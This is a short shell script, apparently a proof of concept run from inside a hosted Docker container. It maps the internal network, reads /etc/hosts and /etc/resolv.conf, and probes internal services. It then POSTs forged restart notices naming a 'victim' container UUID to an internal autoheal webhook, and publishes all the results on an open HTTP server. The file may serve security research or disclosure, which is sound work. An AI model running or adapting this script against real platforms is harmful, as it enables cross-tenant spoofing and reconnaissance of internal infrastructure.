#!/bin/sh
# Probe agent network from backend (docker) container
# Backend containers should be on the same Docker network as agent/autoheal

echo "=== Backend Container Network Probe ===" > /app/index.html
echo "Started: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html

echo "--- ip addr ---" >> /app/index.html
ip addr 2>&1 | grep -E "inet |eth" >> /app/index.html

echo "--- ip route ---" >> /app/index.html
ip route >> /app/index.html 2>&1

echo "--- resolv.conf ---" >> /app/index.html
cat /etc/resolv.conf >> /app/index.html 2>&1

echo "--- /etc/hosts ---" >> /app/index.html
cat /etc/hosts >> /app/index.html 2>&1

echo "--- nslookup agent ---" >> /app/index.html
nslookup agent >> /app/index.html 2>&1

echo "--- nslookup caddy ---" >> /app/index.html
nslookup caddy >> /app/index.html 2>&1

echo "--- nslookup autoheal ---" >> /app/index.html
nslookup autoheal >> /app/index.html 2>&1

# Try to reach agent webhook on various addresses
echo "--- webhook probe ---" >> /app/index.html
for target in agent:8000 172.17.0.1:8000 172.18.0.1:8000 caddy:80 autoheal:8000; do
    host=$(echo $target | cut -d: -f1)
    port=$(echo $target | cut -d: -f2)
    echo "  GET http://$target/ ..." >> /app/index.html
    curl -s -m 3 -o /tmp/r -w "  -> HTTP %{http_code}\n" "http://$target/" >> /app/index.html 2>&1
done

# Try POST to autoheal webhook with GT victim UUID
echo "--- autoheal webhook POST ---" >> /app/index.html
VICTIM_UUID="db79996a-f3ed-4d5a-ad6f-8e4194d97f9d"
PAYLOAD="{\"content\":\"Container ${VICTIM_UUID}_00000000-fake-deploy (unhealthy) restarted by PoC\"}"

for target in agent:8000 172.17.0.1:8000 172.18.0.1:8000; do
    echo "  POST http://$target/webhooks/autoheal" >> /app/index.html
    curl -s -m 3 -o /tmp/r -w "  -> HTTP %{http_code}" -X POST \
        "http://$target/webhooks/autoheal" \
        -H "Content-Type: application/json" \
        -d "$PAYLOAD" >> /app/index.html 2>&1
    echo "" >> /app/index.html
    cat /tmp/r >> /app/index.html 2>/dev/null
    echo "" >> /app/index.html
done

echo "--- scan complete ---" >> /app/index.html
echo "Finished: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> /app/index.html

# Serve results
cd /app && python3 -m http.server 8080
